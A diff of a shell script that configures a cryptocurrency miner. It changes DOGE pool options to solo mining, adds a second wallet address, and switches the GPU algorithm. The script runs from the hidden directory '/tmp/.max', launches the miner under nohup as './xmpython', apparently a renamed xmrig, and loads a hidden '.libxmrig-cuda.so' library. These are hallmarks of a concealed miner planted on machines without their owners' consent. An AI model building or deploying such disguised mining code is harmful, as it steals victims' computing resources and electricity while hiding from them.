@@ -27,7 +27,7 @@ ASIA_PROX=49.12.115.117
 
 #VCOptions="d=16,xn=1,hybrid"
 #VCOptions="mc=VRSC"
-VCOptions="c=DOGE,mc=VRSC"
+VCOptions="c=DOGE,m=solo"
 #VCOptions="c=VRSC,mc=VRSC"
 
 #VCOptions="X"
@@ -49,14 +49,16 @@ Debug=False
 #Keys
 W_BT="1MEdZan82tai5Kb7fqFJNgfpGhtsP47MFT"
 W_DG="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"
+W_DG2="DSro3i42vz2MytCw22S4wun5qM5bTNNy5c"
 W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
 W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
 W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
 W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
 
-P_DG='c=DOGE'
+P_DG='c=DOGE,m=solo'
 
-W_VC=$W_DG
+W_VC=$W_DG2
+
 
 # Directory
 Work_Dir="/tmp/.max"
@@ -89,7 +91,7 @@ test2_cpu () {
 }
 
 test_gpu () {
-  local Algo='gr'
+  local Algo='cn/upx2'
     nohup ./xmpython -a $gpuAlgo -o stratum+tcp://$PROX:$TESTPort1 -u $W_DG -p $P_DG 	--cuda-loader=".libxmrig-cuda.so" --cuda
 
 
